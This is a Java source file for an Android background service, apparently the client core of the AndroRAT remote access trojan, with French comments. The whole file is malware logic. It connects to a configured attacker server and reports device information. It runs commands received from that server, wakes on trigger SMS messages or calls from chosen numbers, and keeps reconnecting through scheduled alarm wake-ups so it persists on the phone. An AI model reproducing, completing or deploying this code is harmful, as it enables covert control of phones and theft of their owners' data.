package my.app.client;


import inout.Controler;
import inout.Protocol;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.StringTokenizer;
import java.util.prefs.Preferences;

import out.Connection;


import my.app.Library.CallMonitor;
import my.app.Library.SystemInfo;

import Packet.*;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.location.Address;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
import android.widget.Toast;

public class Client extends ClientListener implements Controler {

	public final String TAG = Client.class.getSimpleName();
	Connection conn;

	int nbAttempts = 10; //sera décrementé a 5 pour 5 minute 3 pour  10 minute ..
	int elapsedTime = 1; // 1 minute
	
	boolean stop = false; //Pour que les threads puissent s'arreter en cas de déconnexion
	
	boolean isRunning = false; //Le service tourne
	boolean isListening = false; //Le service est connecté au serveur
	//final boolean waitTrigger = false; //On attend un évenement pour essayer de se connecter.
	Thread readthread;
	ProcessCommand procCmd ;
	byte[] cmd ;
	CommandPacket packet ;
	
	private Handler handler = new Handler() {
		
		public void handleMessage(Message msg) {
			Bundle b = msg.getData();
			processCommand(b);
		}
	};
	
	
	
	public void onCreate() {
		Log.i(TAG, "In onCreate");
		infos = new SystemInfo(this);
		procCmd = new ProcessCommand(this);
		
		loadPreferences();
	}
	
	public int onStartCommand(Intent intent, int flags, int startId) {
		//toast = Toast.makeText(this	,"Prepare to laod", Toast.LENGTH_LONG);
		//loadPreferences("preferences");
		//Intent i = new Intent(this,Preferences.class);
		//startActivity(i);
		if(intent == null)
			return START_STICKY;
		String who = intent.getAction();
		Log.i(TAG, "onStartCommand by: "+ who); //On affiche qui a déclenché l'event
		
		if (intent.hasExtra("IP"))
			this.ip = intent.getExtras().getString("IP");
		if (intent.hasExtra("PORT"))
			this.port = intent.getExtras().getInt("PORT");		
		
		if(!isRunning) {// C'est la première fois qu'on le lance
			
		  	//--- On ne passera qu'une fois ici ---
		    IntentFilter filterc = new IntentFilter("android.net.conn.CONNECTIVITY_CHANGE"); //Va monitorer la connexion
		    registerReceiver(ConnectivityCheckReceiver, filterc);
			isRunning = true;
			conn = new Connection(ip,port,this);//On se connecte et on lance les threads
			
			if(waitTrigger) { //On attends un evenement pour se connecter au serveur
			  	//On ne fait rien
				registerSMSAndCall();
			}
			else {
				Log.i(TAG,"Try to connect to "+ip+":"+port);
				if(conn.connect()) {
					packet = new CommandPacket();
					readthread = new Thread(new Runnable() { public void run() { waitInstruction(); } });
					readthread.start(); //On commence vraiment a écouter
					CommandPacket pack = new CommandPacket(Protocol.CONNECT, 0, infos.getBasicInfos());
					handleData(0,pack.build());					
					//gps = new GPSListener(this, LocationManager.NETWORK_PROVIDER,(short)4); //!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
					isListening = true;
					if(waitTrigger) {
						unregisterReceiver(SMSreceiver); //On désenregistre SMS et Call pour éviter tout appel inutile
						unregisterReceiver(Callreceiver);
						waitTrigger = false;
					}
				}
				else {
					if(isConnected) { //On programme le AlarmListener car y a un probleme coté serveur
						resetConnectionAttempts();
						reconnectionAttempts();
					}
					else { //On attend l'update du ConnectivityListener pour se débloquer 
						Log.w(TAG,"Not Connected wait a Network update");
					}
				}
			}
		}	
		else { //Le service a déjà été lancé
			if(isListening) {
				Log.w(TAG,"Called uselessly by: "+ who + " (already listening)");
			}
			else { //Sa veut dire qu'on a reçu un broadcast sms ou call
				//On est ici soit par AlarmListener, ConnectivityManager, SMS/Call ou X
				//Dans tout les cas le but ici est de se connecter
				Log.i(TAG,"Connection by : "+who);
				if(conn.connect()) {
					readthread = new Thread(new Runnable() { public void run() { waitInstruction(); } });
					readthread.start(); //On commence vraiment a écouter
					CommandPacket pack = new CommandPacket(Protocol.CONNECT, 0, infos.getBasicInfos());
					handleData(0,pack.build());
					isListening = true;
					if(waitTrigger) {
						unregisterReceiver(SMSreceiver);
						unregisterReceiver(Callreceiver);
						waitTrigger = false; //In case of disconnect does not wait again for a trigger
					}
				}
				else {//On a encore une fois pas réussi a se connecter
					reconnectionAttempts(); // Va relancer l'alarmListener
				}
			}
		}
		 
		return START_STICKY;
	}
	
	
	
	public void waitInstruction() { //Le thread sera bloqué dedans
		try {
			for(;;) {
				if(stop)
					break;
				conn.getInstruction() ;
			}
		}
		catch(Exception e) { 
			isListening = false;
			resetConnectionAttempts();
			reconnectionAttempts();
			if(waitTrigger) {
				registerSMSAndCall();
			}
		}
	}
	
	public void processCommand(Bundle b)
    {
		try{
			procCmd.process(b.getShort("command"),b.getByteArray("arguments"),b.getInt("chan"));
		}
		catch(Exception e) {
			sendError("Error on Client:"+e.getMessage());
		}
    }
	
	public void reconnectionAttempts() 
	{
		/*
		 * 10 fois toute les minutes
		 * 5 fois toutes les 5 minutes
		 * 3 fois toute les 10 minutes
		 * 1 fois au bout de 30 minutes
		 */
		if(!isConnected)
			return;
		
		if(nbAttempts == 0) {
			switch(elapsedTime) {
			case 1:
				elapsedTime = 5;
				break;
			case 5:
				elapsedTime = 10;
				break;
			case 10:
				elapsedTime = 30;
				break;
			case 30:
				return; //Did too much try
			}
		}
		//---- Piece of Code ----
		Calendar cal = Calendar.getInstance();
		cal.add(Calendar.MINUTE, elapsedTime);
		 
		Intent intent = new Intent(this, AlarmListener.class);
		 
		intent.putExtra("alarm_message", "Wake up Dude !");
		
		PendingIntent sender = PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
		// Get the AlarmManager service
		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), sender);
		
		//-----------------------
		nbAttempts --;
	}
	
	public void loadPreferences() {
		PreferencePacket p = procCmd.loadPreferences();
		waitTrigger = p.isWaitTrigger();
		ip = p.getIp();
		port = p.getPort();
		authorizedNumbersCall = p.getPhoneNumberCall();
		authorizedNumbersSMS = p.getPhoneNumberSMS();
		authorizedNumbersKeywords = p.getKeywordSMS();
	}
	
	public void sendInformation(String infos) { //Methode que le Client doit implémenter pour envoyer des informations
		conn.sendData(1, new LogPacket(System.currentTimeMillis(),(byte) 0, infos).build());
	}
	
	public void sendError(String error) { //Methode que le Client doit implémenter pour envoyer des informations
		conn.sendData(1, new LogPacket(System.currentTimeMillis(),(byte) 1, error).build());
	}
	
	public void handleData(int channel, byte[] data) {
		conn.sendData(channel, data);
	}

	
	public void onDestroy() {
		//savePreferences("myPref");
		//savePreferences("preferences");
		
		Log.i(TAG, "in onDestroy");
		unregisterReceiver(ConnectivityCheckReceiver);
		conn.stop();
		stop = true;
		stopSelf();
		super.onDestroy();
	}
	
	public void resetConnectionAttempts() {
		nbAttempts = 10;
		elapsedTime = 1;
	}
	
	public void registerSMSAndCall() {
        IntentFilter filter = new IntentFilter();
        filter.addAction("android.provider.Telephony.SMS_RECEIVED"); //On enregistre un broadcast receiver sur la reception de SMS
        registerReceiver(SMSreceiver, filter);
        IntentFilter filter2 = new IntentFilter();
        filter2.addAction("android.intent.action.PHONE_STATE");//TelephonyManager.ACTION_PHONE_STATE_CHANGED); //On enregistre un broadcast receiver sur la reception de SMS
        registerReceiver(Callreceiver, filter2);
	}

	public void Storage(TransportPacket p, String i) 
	{
		try
		{
			packet = new CommandPacket(); //!!!!!!!!!!!! Sinon on peut surement en valeur les arguments des command précédantes !
			packet.parse(p.getData());
			
			Message mess = new Message();
			Bundle b = new Bundle();
			b.putShort("command", packet.getCommand());
			b.putByteArray("arguments", packet.getArguments());
			b.putInt("chan", packet.getTargetChannel());
			mess.setData(b);
			handler.sendMessage(mess);
		}
		catch(Exception e)
		{
			System.out.println("Androrat.Client.storage : pas une commande");
		}		
	}
}
